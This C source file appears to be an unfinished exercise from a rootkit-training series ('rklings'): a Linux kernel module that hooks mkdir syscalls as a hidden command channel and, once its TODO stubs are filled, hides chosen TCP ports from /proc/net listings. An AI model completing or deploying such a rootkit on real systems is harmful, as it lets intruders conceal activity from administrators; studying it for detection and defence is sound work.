// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/ptrace.h>
#include <linux/seq_file.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <net/inet_sock.h>

#define RK_PREFIX	"rklings."
#define RK_PREFIX_LEN	8
#define RK_PATH_MAX	128
#define RK_TARGET_MAX	32
#define RK_NAME_MAX	64

struct rk_target_list {
	spinlock_t lock;
	char targets[RK_TARGET_MAX][RK_NAME_MAX];
	int count;
};

static struct rk_target_list port_targets;

// TODO 1: complete the target list (add, remove, match)

static int rk_target_add(struct rk_target_list *list, const char *name)
{
	return -ENOSYS;
}

static int rk_target_remove(struct rk_target_list *list, const char *name)
{
	return -ENOSYS;
}

static bool rk_target_match(struct rk_target_list *list, const char *name)
{
	return false;
}

/* ---- tcp seq_show interception ---- */

struct tcp_show_data {
	struct seq_file *seq;
	int saved_count;
	struct sock *sk;
};

static int tcp_show_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	// TODO 2: save seq->count and sock from direct regs (not inner pt_regs)
	return 0;
}

static int tcp_show_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	// TODO 3: skip SEQ_START_TOKEN, extract port via inet_sk, rewind seq->count if match
	return 0;
}

static struct kretprobe tcp4_probe = {
    .handler = tcp_show_return,
    .entry_handler = tcp_show_entry,
    .data_size = sizeof(struct tcp_show_data),
    .maxactive = 20,
    .kp.symbol_name = "tcp4_seq_show",
};

static struct kretprobe tcp6_probe = {
    .handler = tcp_show_return,
    .entry_handler = tcp_show_entry,
    .data_size = sizeof(struct tcp_show_data),
    .maxactive = 20,
    .kp.symbol_name = "tcp6_seq_show",
};

/* ---- mkdir command dispatcher (provided) ---- */

typedef int (*rk_handler_t)(const char *arg);

struct rk_cmd_entry {
	const char *key;
	rk_handler_t handler;
};

static int cmd_hide_port(const char *arg)   { return rk_target_add(&port_targets, arg); }
static int cmd_unhide_port(const char *arg) { return rk_target_remove(&port_targets, arg); }

static const struct rk_cmd_entry cmd_table[] = {
	{ "h.p", cmd_hide_port },
	{ "u.p", cmd_unhide_port },
};

static int rk_dispatch(const char *name)
{
	const struct rk_cmd_entry *best = NULL;
	int best_len = 0;
	const char *arg;
	int i;

	for (i = 0; i < ARRAY_SIZE(cmd_table); i++) {
		int klen = strlen(cmd_table[i].key);

		if (strncmp(name, cmd_table[i].key, klen) != 0)
			continue;
		if (name[klen] != '\0' && name[klen] != '.')
			continue;
		if (klen > best_len) {
			best = &cmd_table[i];
			best_len = klen;
		}
	}

	if (!best)
		return -ENOENT;

	arg = name[best_len] == '.' ? name + best_len + 1 : NULL;
	return best->handler(arg);
}

struct rk_mkdir_data {
	int result;
	bool intercepted;
};

static int rk_mkdir_do_entry(struct kretprobe_instance *inst,
			     const char __user *pathname)
{
	struct rk_mkdir_data *data;
	char buf[RK_PATH_MAX];
	long copied;

	data = (struct rk_mkdir_data *)inst->data;
	data->intercepted = false;

	copied = strncpy_from_user(buf, pathname, sizeof(buf));
	if (copied <= 0)
		return 0;

	if (strncmp(buf, RK_PREFIX, RK_PREFIX_LEN) != 0)
		return 0;

	data->result = rk_dispatch(buf + RK_PREFIX_LEN);
	data->intercepted = true;

	put_user('\0', (char __user *)pathname);
	return 0;
}

static int rk_mkdir_entry_mkdir(struct kretprobe_instance *inst,
				struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_mkdir_do_entry(inst, (const char __user *)uregs->di);
}

static int rk_mkdir_entry_mkdirat(struct kretprobe_instance *inst,
				  struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_mkdir_do_entry(inst, (const char __user *)uregs->si);
}

static int rk_mkdir_return(struct kretprobe_instance *inst,
			   struct pt_regs *regs)
{
	struct rk_mkdir_data *data;

	data = (struct rk_mkdir_data *)inst->data;
	if (data->intercepted)
		regs_set_return_value(regs, (unsigned long)(long)data->result);
	return 0;
}

static struct kretprobe rk_mkdir_probe = {
    .kp.symbol_name = "__x64_sys_mkdir",
    .entry_handler = rk_mkdir_entry_mkdir,
    .handler = rk_mkdir_return,
    .data_size = sizeof(struct rk_mkdir_data),
    .maxactive = 8,
};

static struct kretprobe rk_mkdirat_probe = {
    .kp.symbol_name = "__x64_sys_mkdirat",
    .entry_handler = rk_mkdir_entry_mkdirat,
    .handler = rk_mkdir_return,
    .data_size = sizeof(struct rk_mkdir_data),
    .maxactive = 8,
};

/* ---- module lifecycle ---- */

static int __init rk_init(void)
{
	int ret;

	spin_lock_init(&port_targets.lock);

	// TODO 4: register tcp4 + tcp6 + mkdir probes with goto rollback, pr_info loaded

	return 0;
}

static void __exit rk_exit(void)
{
	// TODO 5: unregister probes in reverse, pr_info unloaded
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings port filter");
